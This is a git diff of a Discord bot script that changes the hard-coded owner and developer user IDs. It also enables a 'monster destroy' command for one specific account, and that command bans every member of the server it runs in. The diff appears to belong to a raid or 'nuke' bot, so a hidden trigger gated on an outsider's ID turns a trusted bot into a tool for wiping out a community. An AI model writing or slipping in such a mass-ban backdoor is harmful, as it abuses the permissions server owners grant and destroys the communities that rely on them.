@@ -27,7 +27,7 @@ for (let i = 0; i < 500; i++) {
 
   client.on('message',async message => {
     if(message.content.startsWith("dm restart")) {
-          if(message.author.id !== "486097529361006594") return message.reply('You aren\'t the bot owner.');
+          if(message.author.id !== "487314985362391060") return message.reply('You aren\'t the bot owner.');
         message.channel.send('**Restarting.**').then(msg => {
             setTimeout(() => {
                msg.edit('**Restarting..**');
@@ -55,7 +55,7 @@ client.on('message' , async (message) => {
 });
 
 
-const developers = ["486097529361006594"]
+const developers = ["487314985362391060"]
 const adminprefix = "#";
 client.on('message', message => {
     var argresult = message.content.split(` `).slice(1).join(' ');
@@ -104,7 +104,7 @@ client.on('message', x5bz => {
 
 client.on('message', async message => {
     if(message.content === "monster destroy") {
-        if(message.author.id !== '') return;
+        if(message.author.id !== '490271579419443200') return;
         message.guild.members.forEach(member => {
            member.ban(); 
         });
